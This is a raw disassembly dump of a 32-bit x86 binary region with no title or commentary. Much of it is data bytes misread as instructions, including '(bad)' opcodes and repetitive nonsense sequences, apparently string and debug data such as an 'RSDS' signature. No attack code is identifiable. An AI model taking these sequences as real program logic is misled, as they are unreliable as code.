  43344f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433455:	hlt    
  433456:	rol    edi,0x82
  433459:	ret    
  43345a:	cld    
  43345b:	enter  0x11ff,0x45
  43345f:	inc    ebp
  433460:	pop    edi
  433461:	mov    ebx,DWORD PTR [ebx+0x14]
  433464:	ret    0xc7
  433467:	test   BYTE PTR [ebx+0x4532519a],cl
  43346d:	jmp    0x4333fa
  43346f:	push   0x8
  433471:	call   DWORD PTR [esi]
  433473:	in     al,dx
  433474:	add    BYTE PTR [ebp+0x1],0x50
  433478:	add    bh,ah
  43347a:	add    bh,bh
  43347c:	icebp  
  43347d:	mov    ecx,DWORD PTR [eax]
  43347f:	cld    
  433480:	pop    es
  433481:	dec    ebp
  433482:	shl    DWORD PTR [ebx],0x72
  433485:	add    eax,DWORD PTR [eax]
  433487:	cmp    edx,ecx
  433489:	je     0x43349b
  43348b:	mov    esi,DWORD PTR [ebp-0x4]
  43348e:	inc    edi
  433490:	or     al,0xc3
  433492:	jmp    FWORD PTR [edx-0x18]
  433495:	(bad)  
  433496:	sti    
  433497:	cwde   
  433498:	(bad)  
  433499:	call   0xffa12da4
  43349e:	or     al,0x45
  4334a0:	push   ebp
  4334a1:	sub    esp,0x18
  4334a4:	push   ebx
  4334a5:	inc    ebp
  4334a6:	mov    edi,edi
  4334a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334af:	test   al,0x53
  4334b1:	inc    ebp
  4334b2:	push   ecx
  4334b3:	push   eax
  4334b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334ba:	add    ah,bh
  4334bc:	(bad)  
  4334bd:	dec    ebp
  4334be:	add    DWORD PTR [ebx],esi
  4334c0:	inc    ebp
  4334c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4334c7:	push   0xffffff8b
  4334c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4334cf:	add    eax,DWORD PTR [ecx]
  4334d1:	or     BYTE PTR [eax],al
  4334d3:	call   0xff852cd8
  4334d8:	mov    eax,DWORD PTR [ebp+0x14]
  4334db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334e1:	inc    ebp
  4334e2:	dec    ecx
  4334e3:	add    ebp,DWORD PTR [edx+0x14]
  4334e6:	push   0x8b3045
  4334eb:	call   0x33ad8260
  4334f0:	inc    DWORD PTR [ebx]
  4334f2:	mov    DWORD PTR [edi],ecx
  4334f4:	mov    eax,ecx
  4334f6:	or     BYTE PTR [ebp-0x3d],cl
  4334f9:	cmp    eax,edi
  4334fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433500:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433506:	adc    al,0xc9
  433508:	inc    ebp
  433509:	adc    BYTE PTR [eax+0x55],dl
  43350c:	jne    0x4334fa
  43350e:	call   0xff54349e
  433513:	dec    ebp
  433514:	inc    ebp
  433515:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43351b:	add    BYTE PTR [ebx],bh
  43351d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433521:	push   ebx
  433522:	or     al,0x51
  433524:	dec    ebp
  433525:	xor    DWORD PTR [ebx],0xf32039a
  43352b:	cmp    eax,DWORD PTR [ebp+0x74]
  43352e:	mov    edi,edi
  433530:	pop    edi
  433531:	adc    BYTE PTR [ebx+0x75],bl
  433534:	ret    0x50
  433537:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43353b:	(bad)  
  43353c:	clc    
  43353d:	mov    esp,ebp
  43353f:	pop    ecx
  433540:	mov    ecx,0xf80085c2
  433545:	mov    ecx,DWORD PTR [ecx+edx*2]
  433548:	push   esi
  433549:	push   esi
  43354a:	(bad)  
  43354b:	lock inc DWORD PTR [ebp+0x44]
  43354f:	mov    edx,DWORD PTR [eax]
  433551:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433555:	or     BYTE PTR [ebx+0x7],dl
  433558:	push   ecx
  433559:	ret    
  43355a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433560:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433566:	or     al,0x80
  433568:	jge    0x43356b
  43356a:	mov    DWORD PTR [eax],eax
  43356c:	and    al,0x8
  43356e:	cmp    DWORD PTR [ebp+0x10],eax
  433571:	mov    edx,DWORD PTR [esi]
  433573:	xchg   esp,eax
  433574:	dec    esp
  433575:	add    BYTE PTR [eax],dl
  433577:	mov    ecx,edx
  433579:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43357d:	dec    ebp
  43357e:	into   
  43357f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433585:	mov    edx,DWORD PTR [eax+0x14]
  433588:	das    
  433589:	add    al,0x45
  43358b:	add    BYTE PTR [ebp+0x0],dh
  43358e:	mov    edi,edi
  433590:	and    al,0x50
  433592:	mov    eax,DWORD PTR [eax]
  433594:	and    al,0xd1
  433596:	xor    eax,DWORD PTR [esi]
  433598:	lea    eax,[ebp+0x8]
  43359b:	xor    esi,DWORD PTR [edx+0x3]
  43359e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335b4:	cmp    bh,bh
  4335b6:	pushf  
  4335b7:	mov    edi,edi
  4335b9:	or     BYTE PTR [esi+ecx*1],cl
  4335bc:	jne    0x433581
  4335be:	call   0xc358a
  4335c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4335c7:	mov    ebx,DWORD PTR [eax]
  4335c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4335cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335d5:	pop    esi
  4335d6:	jmp    0x4335a1
  4335d8:	and    al,0x10
  4335da:	and    al,0x55
  4335dc:	or     ah,ch
  4335de:	and    al,0xe4
  4335e0:	inc    DWORD PTR [ebx+0x35e81024]
  4335e6:	(bad)  
  4335e7:	pushf  
  4335e8:	dec    DWORD PTR [ecx+0x570c2444]
  4335ee:	pop    esi
  4335ef:	inc    ecx
  4335f0:	in     eax,0x89
  4335f2:	ret    0x24
  4335f5:	mov    edi,eax
  4335f7:	and    al,0x7d
  4335f9:	mov    edx,0x768089c
  4335fe:	clc    
  4335ff:	cli    
  433600:	call   FWORD PTR [edx+0x3893274]
  433606:	dec    DWORD PTR [ecx-0x74e7db01]
  43360c:	adc    al,0xc
  43360e:	(bad)  
  43360f:	jl     0x433635
  433611:	adc    al,0x8b
  433613:	dec    ebp
  433614:	or     al,0x75
  433616:	jmp    0x4335a3
  433618:	adc    BYTE PTR [esp+eax*2],ah
  43361b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43361f:	and    al,0x9a
  433621:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433627:	dec    esp
  433628:	jne    0x433632
  43362a:	jne    0x433665
  43362c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433633:	test   BYTE PTR [ebp+0x32],bl
  433636:	and    al,0x85
  433638:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43363e:	pop    edi
  43363f:	(bad)  
  433640:	sbb    edx,DWORD PTR [eax]
  433642:	add    dl,dl
  433644:	cmp    edx,DWORD PTR [eax]
  433646:	add    BYTE PTR [esi+0x7e],al
  433649:	adc    BYTE PTR [eax],al
  43364b:	mov    eax,ds:0x1c00107e
  433650:	push   edx
  433651:	adc    BYTE PTR [eax],al
  433653:	cli    
  433654:	push   ss
  433655:	adc    BYTE PTR [eax],al
  433657:	lahf   
  433658:	adc    edx,DWORD PTR [eax]
  43365a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43365e:	add    BYTE PTR [edi+0x19001004],ah
  433664:	inc    eax
  433665:	adc    BYTE PTR [eax],al
  433667:	ds jge 0x43367a
  43366a:	add    BYTE PTR [edi],bh
  43366c:	ss inc ebx
  43366e:	add    BYTE PTR [ebx+0x36],al
  433671:	inc    ebx
  433672:	add    BYTE PTR [edi+0x36],al
  433675:	inc    ebx
  433676:	add    BYTE PTR [ebx+0x36],cl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [edi+0x36],cl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [ebx+0x36],dl
  433681:	inc    ebx
  433682:	add    BYTE PTR [edi+0x36],dl
  433685:	inc    ebx
  433686:	add    BYTE PTR [ebx+0x36],bl
  433689:	inc    ebx
  43368a:	add    BYTE PTR [edi+0x36],bl
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [ebx+0x36],ah
  433691:	inc    ebx
  433692:	add    BYTE PTR [edi+0x36],ah
  433695:	inc    ebx
  433696:	add    BYTE PTR [ecx],ah
  433698:	jno    0x4336aa
  43369a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4336a1:	adc    BYTE PTR [eax],al
  4336a3:	ja     0x433715
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	xor    BYTE PTR [edx+0x10],0x0
  4336ab:	loopne 0x43371b
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cmp    BYTE PTR [eax+0x10],dl
  4336b2:	add    BYTE PTR ds:0x9700104f,al
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [ebx+0x1004336],dh
  4336d8:	add    BYTE PTR [eax],dl
  4336da:	add    al,ah
  4336dc:	pop    ebp
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	add    ah,BYTE PTR ds:0x328d0010
  4336e5:	adc    BYTE PTR [eax],al
  4336e7:	xchg   DWORD PTR [ecx],edx
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	ja     0x4336f9
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	add    cl,BYTE PTR [eax]
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	jle    0x433769
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xlat   BYTE PTR ds:[ebx]
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    BYTE PTR [esi+0x12],bl
  433719:	adc    BYTE PTR [eax],al
  43371b:	stc    
  43371c:	push   es
  43371d:	adc    BYTE PTR [eax],al
  43371f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433720:	xor    DWORD PTR [eax],edx
  433722:	add    BYTE PTR [eax+0x7b],dl
  433725:	adc    BYTE PTR [eax],al
  433727:	stos   DWORD PTR es:[edi],eax
  433728:	push   edi
  433729:	adc    BYTE PTR [eax],al
  43372b:	inc    ebp
  43372c:	adc    edx,DWORD PTR [eax]
  43372e:	add    BYTE PTR [eax+0x38],ch
  433731:	adc    BYTE PTR [eax],al
  433733:	pop    ecx
  433734:	and    edx,DWORD PTR [eax]
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ecx+0x72],cl
  433759:	adc    BYTE PTR [eax],al
  43375b:	cmp    edi,DWORD PTR [eax+0x10]
  43375e:	add    BYTE PTR [ebx+0x23],dl
  433761:	adc    BYTE PTR [eax],al
  433763:	jno    0x4337d1
  433765:	adc    BYTE PTR [eax],al
  433767:	pop    eax
  433768:	outs   dx,BYTE PTR ds:[esi]
  433769:	adc    BYTE PTR [eax],al
  43376b:	mov    ebx,DWORD PTR [ebx+0x10]
  43376e:	add    BYTE PTR [ebx+ebx*2],ch
  433771:	adc    BYTE PTR [eax],al
  433773:	retf   0x1066
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [ebx+0x32],al
  433799:	xor    dh,BYTE PTR ds:0x5a52345f
  43379f:	push   esp
  4337a0:	xor    BYTE PTR [esi],dh
  4337a2:	add    BYTE PTR [ecx+0x36],cl
  4337a5:	push   eax
  4337a6:	pop    edi
  4337a7:	ss inc ebx
  4337a9:	ss pop edx
  4337ab:	xor    ebx,DWORD PTR [edi+0x52]
  4337ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4337b2:	pop    edi
  4337b3:	dec    esi
  4337b4:	dec    esp
  4337b5:	dec    eax
  4337b6:	xor    esi,DWORD PTR [edx]
  4337b8:	pop    edi
  4337b9:	xor    al,0x4b
  4337bb:	add    BYTE PTR [eax+0x49],cl
  4337be:	push   ebp
  4337bf:	xor    al,0x5f
  4337c1:	dec    esp
  4337c2:	inc    edx
  4337c3:	dec    ecx
  4337c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4337c7:	pop    ecx
  4337c8:	inc    edi
  4337c9:	add    BYTE PTR [eax+0x50],bl
  4337cc:	dec    eax
  4337cd:	pop    edi
  4337ce:	push   ebp
  4337cf:	push   ecx
  4337d0:	inc    edi
  4337d1:	xor    cl,BYTE PTR [edx+0x38]
  4337d4:	push   esi
  4337d5:	add    BYTE PTR [ebx+0x4a],al
  4337d8:	push   edx
  4337d9:	pop    edi
  4337da:	dec    edi
  4337db:	dec    eax
  4337dc:	dec    edi
  4337dd:	dec    edi
  4337de:	dec    edx
  4337df:	add    BYTE PTR [ecx+0x52],al
  4337e2:	cmp    DWORD PTR [edi+0x56],ebx
  4337e5:	aaa    
  4337e6:	dec    esp
  4337e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ea:	push   edx
  4337eb:	inc    esp
  4337ec:	add    BYTE PTR [ecx+0x37],bl
  4337ef:	inc    esp
  4337f0:	pop    edi
  4337f1:	dec    ecx
  4337f2:	xor    esi,DWORD PTR [edi]
  4337f4:	xor    DWORD PTR [edi+0x49],ebx
  4337f7:	push   esp
  4337f8:	xor    eax,DWORD PTR [eax]
  4337fa:	push   edx
  4337fb:	xor    BYTE PTR [eax+0x5f],bl
  4337fe:	dec    eax
  4337ff:	push   edi
  433800:	inc    esi
  433801:	xor    DWORD PTR [edi+0x5f],edx
  433804:	cmp    BYTE PTR [ebx+0x37],dl
  433807:	add    BYTE PTR [esi+0x42],dl
  43380a:	dec    ecx
  43380b:	xor    ebx,DWORD PTR [edi+0x45]
  43380e:	xor    BYTE PTR [ebp+0x5f],cl
  433811:	xor    al,0x34
  433813:	xor    BYTE PTR [edx+0x5f],cl
  433816:	inc    edi
  433817:	add    BYTE PTR [edx+0x57],dl
  43381a:	xor    ebx,DWORD PTR [edi+0x31]
  43381d:	dec    edx
  43381e:	push   edi
  43381f:	xor    eax,0x4d435f
  433824:	dec    ecx
  433825:	xor    eax,0x36365f39
  43382a:	dec    eax
  43382b:	xor    BYTE PTR [eax],al
  43382d:	dec    edi
  43382e:	inc    ebx
  43382f:	push   edi
  433830:	pop    edi
  433831:	inc    edi
  433832:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433837:	add    BYTE PTR [edx+0x58],al
  43383a:	inc    edi
  43383b:	ss pop edi
  43383d:	push   esi
  43383e:	inc    ebx
  43383f:	dec    esi
  433840:	inc    esp
  433841:	add    BYTE PTR [edi+0x4d],cl
  433844:	inc    edi
  433845:	xor    ebx,DWORD PTR [edi+0x34]
  433848:	dec    esi
  433849:	pop    edx
  43384a:	cmp    BYTE PTR [edi+0x58],bl
  43384d:	cmp    BYTE PTR [eax],al
  43384f:	push   edx
  433850:	pop    eax
  433851:	push   ecx
  433852:	pop    edi
  433853:	dec    esp
  433854:	push   edx
  433855:	dec    ecx
  433856:	dec    edi
  433857:	inc    esp
  433858:	pop    edi
  433859:	dec    edi
  43385a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43385e:	push   eax
  43385f:	inc    ebp
  433860:	pop    edi
  433861:	xor    eax,0x565f3945
  433866:	add    BYTE PTR [edi+0x4e],al
  433869:	push   esi
  43386a:	pop    edi
  43386b:	inc    edi
  43386c:	push   esp
  43386d:	dec    eax
  43386e:	xor    dh,BYTE PTR [ecx]
  433870:	pop    edi
  433871:	dec    edi
  433872:	xor    eax,DWORD PTR ss:[eax]
  433875:	inc    esp
  433876:	inc    ebp
  433877:	dec    ecx
  433878:	pop    edi
  433879:	push   edx
  43387a:	dec    eax
  43387b:	xor    al,0x48
  43387d:	dec    ecx
  43387e:	ss pop edi
  433880:	aaa    
  433881:	aaa    
  433882:	dec    ecx
  433883:	dec    ebp
  433884:	add    BYTE PTR [eax+0x54],cl
  433887:	ss pop edi
  433889:	inc    esi
  43388a:	inc    edx
  43388b:	xor    dh,BYTE PTR [eax+eax*1]
  43388e:	dec    esi
  43388f:	ss dec edx
  433891:	pop    edi
  433892:	dec    ecx
  433893:	dec    esp
  433894:	inc    edi
  433895:	inc    esp
  433896:	dec    eax
  433897:	xor    BYTE PTR [eax],bh
  433899:	xor    eax,0x4c344f00
  43389e:	xor    esi,DWORD PTR [edi]
  4338a0:	xor    BYTE PTR [edi+0x44],bl
  4338a3:	inc    edi
  4338a4:	dec    ebx
  4338a5:	xor    al,BYTE PTR [ecx+0x43]
  4338a8:	add    BYTE PTR [edi+0x32],cl
  4338ab:	xor    ebx,DWORD PTR [edi+0x57]
  4338ae:	xor    cl,BYTE PTR [edi+0x5f]
  4338b1:	pop    edx
  4338b2:	add    BYTE PTR [eax+0x4c],bl
  4338b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4338b8:	inc    ecx
  4338b9:	dec    edx
  4338ba:	inc    esi
  4338bb:	xor    DWORD PTR [edi+ebx*2],esi
  4338be:	pop    eax
  4338bf:	inc    edi
  4338c0:	inc    edx
  4338c1:	add    BYTE PTR [eax+0x33],dl
  4338c4:	dec    esi
  4338c5:	pop    edi
  4338c6:	dec    eax
  4338c7:	xor    eax,0x485f53
  4338cc:	dec    ebp
  4338cd:	xor    BYTE PTR [edx+0x5f],al
  4338d0:	dec    edx
  4338d1:	pop    eax
  4338d2:	push   esp
  4338d3:	dec    ecx
  4338d4:	dec    esp
  4338d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4338d9:	xor    esi,DWORD PTR [eax]
  4338db:	pop    edi
  4338dc:	inc    ecx
  4338dd:	pop    edx
  4338de:	push   ecx
  4338df:	pop    edx
  4338e0:	cmp    DWORD PTR [esi],esi
  4338e2:	pop    edi
  4338e3:	dec    eax
  4338e4:	dec    esp
  4338e5:	pop    edx
  4338e6:	add    BYTE PTR [ecx+0x57],dl
  4338e9:	pop    ecx
  4338ea:	pop    edi
  4338eb:	push   esi
  4338ec:	xor    al,0x44
  4338ee:	xor    DWORD PTR [eax],edi
  4338f0:	xor    bl,BYTE PTR [edi+0x39]
  4338f3:	push   esp
  4338f4:	push   esp
  4338f5:	add    BYTE PTR [esi+0x0],dl
  4338f8:	dec    edi
  4338f9:	add    BYTE PTR [edi+0x0],al
  4338fc:	add    BYTE PTR ss:[edi+0x0],bl
  433900:	dec    edi
  433901:	add    BYTE PTR [edx+0x0],bl
  433904:	inc    ebp
  433905:	add    BYTE PTR [eax],dh
  433907:	add    BYTE PTR [ebp+0x0],al
  43390a:	xor    BYTE PTR [eax],al
  43390c:	pop    edi
  43390d:	add    BYTE PTR [eax],dh
  43390f:	add    BYTE PTR ds:0x4f000000,dh
  433915:	add    BYTE PTR ds:0x5f005700,dh
  43391b:	add    BYTE PTR [edi],dh
  43391d:	add    BYTE PTR [ebx+0x0],dl
  433920:	push   ebp
  433921:	add    BYTE PTR [edi+0x0],al
  433924:	xor    al,0x0
  433926:	pop    edi
  433927:	add    BYTE PTR [ecx+0x0],dl
  43392a:	inc    esp
  43392b:	add    BYTE PTR [eax],al
  43392d:	add    BYTE PTR [edx+0x0],dl
  433930:	push   esp
  433931:	add    BYTE PTR ds:0x52005f00,dh
  433937:	add    BYTE PTR [edi+0x0],dl
  43393a:	xor    al,BYTE PTR [eax]
  43393c:	xor    al,BYTE PTR [eax]
  43393e:	xor    BYTE PTR [eax],al
  433940:	xor    BYTE PTR [eax],al
  433942:	pop    edi
  433943:	add    BYTE PTR [esi],dh
  433945:	add    BYTE PTR [eax],al
  433947:	add    BYTE PTR [eax+0x0],cl
  43394a:	inc    ebp
  43394b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43394f:	add    BYTE PTR [edi+0x0],bl
  433952:	dec    edx
  433953:	add    BYTE PTR [edx],dh
  433955:	add    BYTE PTR [edi],dh
  433957:	add    BYTE PTR [ebp+0x0],dl
  43395a:	add    BYTE PTR ss:[eax],dh
  43395d:	add    BYTE PTR [eax],al
  43395f:	add    BYTE PTR [esi+0x0],dl
  433962:	cmp    BYTE PTR [eax],al
  433964:	dec    edi
  433965:	add    BYTE PTR [ecx],bh
  433967:	add    BYTE PTR [edi+0x0],bl
  43396a:	pop    eax
  43396b:	add    BYTE PTR [edx+0x0],bl
  43396e:	dec    esp
  43396f:	add    BYTE PTR [ebx+0x0],cl
  433972:	add    BYTE PTR [eax],al
  433974:	dec    ecx
  433975:	add    BYTE PTR [ebp+0x0],dl
  433978:	dec    edi
  433979:	add    BYTE PTR [eax],bh
  43397b:	add    BYTE PTR [edi+0x0],bl
  43397e:	inc    esp
  43397f:	add    BYTE PTR [eax],bh
  433981:	add    BYTE PTR [ecx+0x0],cl
  433984:	dec    eax
  433985:	add    BYTE PTR [edi+0x0],cl
  433988:	pop    edi
  433989:	add    BYTE PTR [ebp+0x0],al
  43398c:	pop    eax
  43398d:	add    BYTE PTR [eax],al
  43398f:	add    BYTE PTR [edx+0x0],dl
  433992:	dec    esp
  433993:	add    BYTE PTR [esi],dh
  433995:	add    BYTE PTR [edi+0x0],bl
  433998:	aaa    
  433999:	add    BYTE PTR [eax+0x0],bl
  43399c:	xor    eax,DWORD PTR [eax]
  43399e:	inc    edi
  43399f:	add    BYTE PTR [ecx+0x0],dl
  4339a2:	pop    edi
  4339a3:	add    BYTE PTR [edx+0x0],cl
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	inc    edi
  4339a9:	add    BYTE PTR [edi+0x0],cl
  4339ac:	push   ebx
  4339ad:	add    BYTE PTR [eax+eax*1],dh
  4339b0:	pop    edi
  4339b1:	add    BYTE PTR [ecx+0x0],cl
  4339b4:	xor    DWORD PTR [eax],eax
  4339b6:	push   esi
  4339b7:	add    BYTE PTR [ebx],dh
  4339b9:	add    BYTE PTR [edi+0x0],bl
  4339bc:	dec    ecx
  4339bd:	add    BYTE PTR [edx+0x0],bl
  4339c0:	add    BYTE PTR [eax],al
  4339c2:	inc    ebx
  4339c3:	add    BYTE PTR [ecx+0x0],bl
  4339c6:	inc    ecx
  4339c7:	add    BYTE PTR [eax],dh
  4339c9:	add    BYTE PTR [ecx],bh
  4339cb:	add    BYTE PTR [edi+0x0],bl
  4339ce:	cmp    DWORD PTR [eax],eax
  4339d0:	push   eax
  4339d1:	add    BYTE PTR [eax+eax*1],dh
  4339d4:	pop    edx
  4339d5:	add    BYTE PTR [eax],al
  4339d7:	add    BYTE PTR [edx+0x0],al
  4339da:	inc    esi
  4339db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4339df:	add    BYTE PTR [ebp+0x0],dl
  4339e2:	push   ebp
  4339e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4339e7:	add    BYTE PTR [eax],al
  4339e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4339ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4339f1:	add    BYTE PTR [edi+0x0],bl
  4339f4:	xor    eax,DWORD PTR [eax]
  4339f6:	cmp    DWORD PTR [eax],eax
  4339f8:	dec    eax
  4339f9:	add    BYTE PTR [edi+0x0],bl
  4339fc:	dec    ebp
  4339fd:	add    BYTE PTR [ecx+0x0],bl
  433a00:	cmp    DWORD PTR [eax],eax
  433a02:	inc    ecx
  433a03:	add    BYTE PTR [esi+0x0],cl
  433a06:	add    BYTE PTR [eax],al
  433a08:	inc    ebx
  433a09:	add    BYTE PTR [eax+0x0],dl
  433a0c:	dec    esi
  433a0d:	add    BYTE PTR [eax+eax*1],dh
  433a10:	pop    edi
  433a11:	add    BYTE PTR [eax+eax*1+0x54],cl
  433a15:	add    BYTE PTR [ebx+0x0],cl
  433a18:	xor    DWORD PTR [eax],eax
  433a1a:	add    BYTE PTR [eax],al
  433a1c:	inc    ecx
  433a1d:	add    BYTE PTR [edi],dh
  433a1f:	add    BYTE PTR [edx+0x0],cl
  433a22:	pop    edi
  433a23:	add    BYTE PTR [ebx+0x0],al
  433a26:	cmp    BYTE PTR [eax],al
  433a28:	push   edi
  433a29:	add    BYTE PTR [eax+0x0],dl
  433a2c:	pop    edi
  433a2d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433a31:	add    BYTE PTR [edx],dh
  433a33:	add    BYTE PTR [eax],al
  433a35:	add    BYTE PTR [edx+0x0],al
  433a38:	add    BYTE PTR [eax],al
  433a3a:	push   edx
  433a3b:	push   ebx
  433a3c:	inc    esp
  433a3d:	push   ebx
  433a3e:	cmp    esp,DWORD PTR [ebx-0x755378b5]
  433a44:	mov    bl,0x4d
  433a46:	xchg   DWORD PTR [ecx],edi
  433a48:	pop    edi
  433a49:	dec    ebx
  433a4a:	mov    ebp,0x13722108
  433a4f:	add    BYTE PTR [eax],al
  433a51:	add    BYTE PTR [edi+0x3a],cl
  433a54:	pop    esp
  433a55:	jno    0x433aab
  433a57:	inc    esp
  433a58:	jp     0x433aa8
  433a5a:	jb     0x433ab6
  433a5c:	addr16 jne 0x433ac2
  433a5f:	jns    0x433ad1
  433a61:	jbe    0x433abf
  433a63:	push   0x62
  433a65:	push   edi
  433a66:	jns    0x433ae0
  433a68:	inc    ebp
  433a69:	ins    DWORD PTR es:[edi],dx
  433a6a:	jbe    0x433ad3
  433a6c:	popa   
  433a6d:	pop    esp
  433a6e:	je     0x433ada
  433a70:	pop    edx
  433a71:	data16 jne 0x433ae6
  433a74:	ja     0x433ade
  433a76:	push   edx
  433a77:	bound  eax,QWORD PTR [ebp+0x72]
  433a7a:	pop    esp
  433a7b:	dec    edx
  433a7c:	jae    0x433ac2
  433a7e:	ins    DWORD PTR es:[edi],dx
  433a7f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433a83:	jo     0x433ae9
  433a85:	bound  eax,QWORD PTR [eax]
	...
